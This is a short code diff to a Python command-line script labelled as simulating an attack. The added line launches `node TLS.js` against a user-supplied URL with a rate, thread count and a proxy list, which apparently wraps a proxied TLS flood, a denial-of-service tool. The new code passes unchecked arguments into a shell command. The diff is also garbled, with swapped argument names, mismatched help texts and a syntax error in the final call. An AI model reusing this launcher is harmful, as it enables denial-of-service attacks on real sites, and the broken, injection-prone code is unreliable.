@@ -65,11 +65,13 @@ def main(url, threads, time, methods):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Simulate an attack command.')
-    parser.add_argument('url', type=str, help='URL to attack')
-    parser.add_argument('threads', type=str, help='Threads for attack')
+    parser.add_argument('methods', type=str, help='URL to attack')
+    parser.add_argument('url', type=str, help='Threads for attack')
     parser.add_argument('time', type=int, help='Time duration of attack')
-    parser.add_argument('methods', type=str, help='Methods used')
+    parser.add_argument('threads', type=str, help='Methods used')
 
     args = parser.parse_args()
 
-    main(args.url, args.threads, args.time, args.methods)
+    os.system(f'node TLS.js {args.url} {args.time} 5000 {args.threads} proxies.txt')
+
+    main(args.methods} args.url, args.time, args.threads)
